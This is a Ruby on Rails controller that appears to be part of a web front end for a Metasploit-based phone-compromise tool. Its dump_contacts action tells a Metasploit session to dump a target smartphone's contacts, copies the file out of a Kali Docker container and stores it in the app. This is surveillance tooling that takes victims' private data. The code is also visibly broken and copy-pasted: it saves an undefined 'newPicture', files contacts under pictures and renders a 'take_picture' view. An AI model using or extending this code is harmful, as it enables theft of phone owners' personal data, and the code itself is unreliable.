class ContactsController < InheritedResources::Base
    def dump_contacts
        commandTimeout=20
        downloadTimeout=20
        @smartphone = Smartphone.find(params[:smartphone_id])

        currentTime = DateTime.now
        currentTimeFormat=currentTime.strftime("%Y-%m-%d_%H--%M--%S")
        @fileName= "contacts_dump_" + currentTimeFormat + '.txt'
        processCommand="dump_contacts -f txt -o #{@fileName}"
        commandOutput=start_msf_process(processCommand)

        1.upto(commandTimeout) do |n|
            if system("docker exec kali_container ls | grep #{@fileName}")
                break
            else
                puts "Waiting ..."
            end
            sleep 1
          end
        copyPictureCommand="docker cp kali_container:/#{@fileName} app\\assets\\images\\files\\pictures\\#{@fileName}"
        system(copyPictureCommand)

        fullPath="app\\assets\\images\\files\\pictures\\" + @fileName
        isOperationSuccessful=false
        1.upto(downloadTimeout) do |n|
            if File.file?(fullPath)
                newContacts=  Picture.new(:date => currentTimeFormat.gsub('_',' ').gsub('--',':'),:filename => @fileName, :smartphone_id => @smartphone.id)
                newPicture.save!
                isOperationSuccessful = true
                break
            end 
        end
        commandOutput=["Operation Failed"] if not isOperationSuccessful

        respond_to do |format|
            format.js { render "take_picture", :locals => {:commandOutput => commandOutput, :fileName => @fileName}  }
          end
    end



  private

    def contact_params
      params.require(:contact).permit(:first_name, :last_name, :phone_number, :smartphone_id)
    end

end
